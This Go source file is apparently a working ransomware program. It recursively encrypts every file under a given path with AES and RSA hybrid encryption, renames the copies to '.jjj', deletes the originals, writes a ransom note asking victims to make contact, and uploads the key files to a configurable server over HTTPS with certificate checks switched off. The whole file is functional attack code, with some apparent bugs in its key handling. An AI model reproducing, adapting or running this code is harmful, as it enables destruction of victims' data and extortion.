package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	//"crypto/internal/fips140/edwards25519/field"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/big"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

type EncryptionInfo struct {
	Path    string `json:"path"`
	Key     []byte `json:"key"`
	OrigExt string `json:"orig_ext,omitempty"`
}

type EncryptionInfos []EncryptionInfo

var clientKey *rsa.PublicKey
var serverKey *rsa.PublicKey
var eis EncryptionInfos

func init() {
	var err error
	serverPrv, err := rsa.GenerateKey(rand.Reader, 1024)
	if err != nil {
		log.Fatal(err)
	}
	serverKey = &serverPrv.PublicKey

	rmifex("server.key")
	os.WriteFile("server.key", x509.MarshalPKCS1PrivateKey(serverPrv), 0444)

	clientPrv, err := rsa.GenerateKey(rand.Reader, 1024)
	if err != nil {
		log.Fatal(err)
	}

	n := big.NewInt(0)
	n.SetBytes(clientPrv.PublicKey.N.Bytes())
	clientKey = &rsa.PublicKey{N: n, E: clientPrv.PublicKey.E}

	encryptedPrv, encSymKey := encryptHybrid(serverKey, x509.MarshalPKCS1PrivateKey(clientPrv))
	rmifex("master.key")
	os.WriteFile("master.key", encryptedPrv, 0444)
	rmifex("keys.json")
	eis = append(eis, EncryptionInfo{Path: "master.key", Key: encSymKey})
	zero(x509.MarshalPKCS1PrivateKey(clientPrv))
}

func encryptHybrid(rsaKey *rsa.PublicKey, bs []byte) ([]byte, []byte) {
	k := make([]byte, 16)
	if _, err := rand.Read(k); err != nil {
		log.Fatal(err)
	}

	blk, err := aes.NewCipher(k)
	if err != nil {
		log.Fatal(err)
	}

	bs = pad(bs, blk.BlockSize())

	iv := make([]byte, blk.BlockSize())
	if _, err := rand.Read(iv); err != nil {
		log.Fatal(err)
	}

	enc := cipher.NewCBCEncrypter(blk, iv)
	enc.CryptBlocks(bs, bs)

	ek, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, rsaKey, k, nil)
	if err != nil {
		log.Fatal(err)
	}
	zero(k)

	ciphertext := append(iv, bs...)
	return ek, ciphertext
}

func pad(bs []byte, blksz int) []byte {
	count := blksz
	if len(bs)%blksz != 0 {
		count = blksz - (len(bs) % blksz)
	}
	padding := bytes.Repeat([]byte{byte(count)}, count)
	bs = append(bs, padding...)
	return bs
}

func rmifex(path string) {
	_, err := os.Stat(path)
	if err == nil {
		os.Remove(path)
	}
}

func zero(bs []byte) {
	for i := range bs {
		bs[i] = 0x41
	}
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: go run main.go <path to encrypt>")
		os.Exit(1)
	}

	victim_path := os.Args[1]

	_, err := os.Stat(victim_path)
	if os.IsNotExist(err) {
		log.Fatal("Error: specified route cannot be found. ->", victim_path)
	}

	err = filepath.Walk(victim_path, walker)
	if err != nil {
		log.Fatal(err)
	}

	fata, _ := json.Marshal(eis)
	err = os.WriteFile("file.keys", fata, 0666)
	if err != nil {
		log.Fatal("Error creating file.keys:", err)
	} else {
		fmt.Println("✅ file.keys created correctly.")
	}

	// ✅ Create ransomnote
	createWarningFile()

	host := os.Getenv("SERVER_HOST")
	port := os.Getenv("SERVER_PORT")
	
	if host == "" {
		host = "localhost"
	}
	if port == "" {
		port = "8443"
	}
	
	serverURL := fmt.Sprintf("https://%s:%s", host, port)
	
		if serverURL != "" {
		err:= sendKeys(serverURL, "file.keys", "master.key")
		if err != nil {
			log.Println("Error sending keys to server:", err)
		} else {
			fmt.Println("✅ Keys sent to server ",serverURL)
		}
	} else {
		fmt.Println("No server URL provided. Skipping key upload.")
	}
}

func walker(path string, info os.FileInfo, err error) error {
	if err != nil {
		log.Println("Error en:", path)
		return err
	}
	if info.IsDir() {
		log.Println(path, "(d)")
		return nil
	}
	log.Println(path, "(f)")
	
	bs, err := os.ReadFile(path)
	if err != nil {
		log.Println("Error reading file:", path, err)
		return err
	}
	
	cbs, k := encryptHybrid(clientKey, bs)

	ext := filepath.Ext(path)
	base := strings.TrimSuffix(path, ext)
	newPath := base + ".jjj" // Extension can be changed here.

	err = os.WriteFile(newPath, cbs, 0666)
	if err != nil {
		log.Println("Error writing encrypted file:", newPath, err)
		return err
	}

	eis = append(eis, EncryptionInfo{Path: newPath, Key: k, OrigExt: ext})

	err = os.Remove(path)
	if err != nil {
		log.Println("Error deleting original file:", path, err)
		return err
	}
	return nil
}

func createWarningFile() {
	message := `Files have been encrypted. If you desire to get them back get in touch with us. C ya!`

	err := os.WriteFile("warning.txt", []byte(message), 0666)
	if err != nil {
		log.Fatal("Error writing warning.txt:", err)
	} else {
		fmt.Println("✅ warning.txt saved correctly.")
	}
}

func sendKeys(serverURL string, fileKeysPath string, masterKeyPath string) error {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	files :=map[string]string{
		"file.keys": fileKeysPath,
		"master.key": masterKeyPath,
	}

	for fieldName, filePath := range files {
		part, err:= writer.CreateFormFile(fieldName, filepath.Base(filePath))
		if err != nil {
			return fmt.Errorf("Error creating part for %s: %w", filePath, err)
		}
		data, err := os.ReadFile(filePath)
		if err != nil {
			return fmt.Errorf("Error reading file %s: %w", filePath, err)
		}
		_,err = io.Copy(part, bytes.NewReader(data))
		if err != nil {
			return fmt.Errorf("Error copying data to part for %s: %w", filePath, err)
		}
	}

	err := writer.Close()
	if err != nil {
		return fmt.Errorf("Error closing writer: %w", err)
	}


	// Allow self-sifned certificates
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	req, err := http.NewRequest("POST", serverURL+"/upload", body)
	if err != nil {
		return fmt.Errorf("Error creating request: %w", err)
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("Error sending POST request: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("Server returned non-200 status: %d", resp.StatusCode)
	}

	return nil
}